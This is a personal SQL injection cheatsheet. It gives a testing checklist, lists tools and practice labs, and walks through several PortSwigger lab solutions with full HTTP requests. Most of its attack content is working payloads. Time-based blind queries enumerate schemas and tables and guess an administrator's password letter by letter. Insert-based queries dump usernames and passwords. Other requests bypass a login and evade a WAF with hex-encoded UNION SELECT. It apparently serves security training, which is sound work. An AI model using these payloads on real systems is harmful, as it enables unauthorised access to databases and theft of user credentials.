 # SQL Injection Cheatsheet

# References

[PortSwigger SQL Injection Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

# Checks

- [ ] Try injecting a single quote and look for anomalies
- [ ] Check boolean values (e.g., `1=1` and `1=2` and look for disparities)
- [ ] Look for any endpoint/functionality that seems like it is touching the DB
    - Try injecting a single or double quote and look for changes in response
    - Try adding comments on login forms to bypass authentication
    - Try to enumerate the database type and version
- [ ] Check if you can trigger an error
    - Visible errors
    - Conditional errors (e.g., divide by zero)
- [ ] Check if you can trigger a conditional response
- [ ] Try to trigger a time delay - sleep
- [ ] Try different encodings like `&#x53;ELECT`

```bash
test@test.com' and 1=sleep(3);-- -
```

```bash
' or 1=(SELECT SLEEP(3) FROM information_schema.SCHEMATA WHERE SCHEMA_NAME like 'i%' LIMIT 1 );--
```

```bash
' or 1=(SELECT SLEEP(3) FROM information_schema.TABLES WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME like 'u%' LIMIT 1 );--
```

```bash
' and (SELECT sleep(3) from information_schema.COLUMNS where TABLE_SCHEMA = 'sqli_four' and TABLE_NAME = 'users' and COLUMN_NAME like 'u%' LIMIT 1);--+-
```

```bash
' AND 1=(SELECT sleep(3) FROM users WHERE username = 'administrator' AND password like 'a%' LIMIT 1);-- -
```

- [ ] Look for any input fields that may be inserting rows into the database and check those for injection as well.

> [!warning] Be careful with testing this. Inserting rows into the db without consideration has the potential to break something in the application.

- Examples
```bash
title',(SELECT GROUP_CONCAT(DISTINCT TABLE_SCHEMA) FROM information_schema.tables));--
```

```bash
title',(SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables where TABLE_SCHEMA='sqli_five'));--
```

```bash
title',(SELECT GROUP_CONCAT(concat(id,':',username,':',password),'<br>') FROM sqli_five.users));--
```

- Blind insert examples

```bash
test',sleep(5),'');-- -
```

```bash
',( select sleep(5) where version() like '8%' ) ,'');--
```

```bash
',( select sleep(5) from flag where flag like 'a%' ),'');--
```

# Labs

- [ ] All PortSwigger SQLi Labs
- [ ] Audi-l/sql-labs
    [GitHub - Audi-1/sqli-labs: SQLI labs to test error based, Blind boolean based, Time based.](https://github.com/Audi-1/sqli-labs)
- [ ] SpiderLabs/MCIR
    [GitHub - SpiderLabs/MCIR: The Magical Code Injection Rainbow! MCIR is a framework for building configurable vulnerability testbeds. MCIR is also a collection of configurable vulnerability testbeds.](https://github.com/SpiderLabs/MCIR)

> [!tip] Note that these last two are not currently maintained.
# Tools

- [ ] sqlmap
- [ ] ghauri
    [GitHub - r0oth3x49/ghauri: An advanced cross-platform tool that automates the process of detecting and exploiting SQL injection security flaws](https://github.com/r0oth3x49/ghauri)

> [!tip] Custom headers are still by far the most common place to still find SQLi

- [ ] hbsqli

# Labs

> [!example]- SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
> 
> 1. Inject a single quote and note the 500 status code
> 2. A second single quote fixes the error
> 3. Send the below request to show all items
> 
> ```
> https://0a52006203faa000da9b48c500b90071.web-security-academy.net/filter?category=Gifts'%20OR%201=1--%20-
> ```

> [!example]- SQL injection vulnerability allowing login bypass
> 
> 4. Send the credentials `administrator:password` and notice that it fails
> 5. Send the following request and bypass the authentication mechanism
> 
> ```
> POST /login HTTP/2
> Host: 0a610047042d1026803bee9900bd0078.web-security-academy.net
> Cookie: session=VKoDv0fEUU2tgdJAJhJauLtVwpmd4rZQ
> Content-Length: 83
> Cache-Control: max-age=0
> Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144"
> Sec-Ch-Ua-Mobile: ?0
> Sec-Ch-Ua-Platform: "macOS"
> Accept-Language: en-US,en;q=0.9
> Origin: https://0a610047042d1026803bee9900bd0078.web-security-academy.net
> Content-Type: application/x-www-form-urlencoded
> Upgrade-Insecure-Requests: 1
> User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
> Sec-Fetch-Site: same-origin
> Sec-Fetch-Mode: navigate
> Sec-Fetch-User: ?1
> Sec-Fetch-Dest: document
> Referer: https://0a610047042d1026803bee9900bd0078.web-security-academy.net/login
> Accept-Encoding: gzip, deflate, br
> Priority: u=0, i
> 
> csrf=foQ9RRJfFo7Z9DIialQ8ejlbNq0cBjwv&username=administrator%27--&password=password
> ```

> [!example]- SQL injection with filter bypass via XML encoding
> 
> 1. Check the stock on any item and note the POST request contains XML in the body
> 2. Use `hex_entities` in hackvertor to obfuscate the payload to bypass the WAF
> 3. Send the following request to get all credentials
> 4. Log in as admin to solve the lab
> 
> ```
> POST /product/stock HTTP/2
> Host: 0a13008603ab45d581535c30006600e7.web-security-academy.net
> Cookie: session=ezecKklwjpcvZJxxOIOVONBzEq8NcPnl
> Content-Length: 190
> Sec-Ch-Ua-Platform: "macOS"
> Accept-Language: en-US,en;q=0.9
> Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144"
> Content-Type: application/xml
> Sec-Ch-Ua-Mobile: ?0
> User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
> Accept: */*
> Origin: https://0a13008603ab45d581535c30006600e7.web-security-academy.net
> Sec-Fetch-Site: same-origin
> Sec-Fetch-Mode: cors
> Sec-Fetch-Dest: empty
> Referer: https://0a13008603ab45d581535c30006600e7.web-security-academy.net/product?productId=1
> Accept-Encoding: gzip, deflate, br
> Priority: u=1, i
> 
> <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId><@hex_entities>1 UNION SELECT username || '~' || password from users</@hex_entities></storeId></stockCheck>
> ```
> 







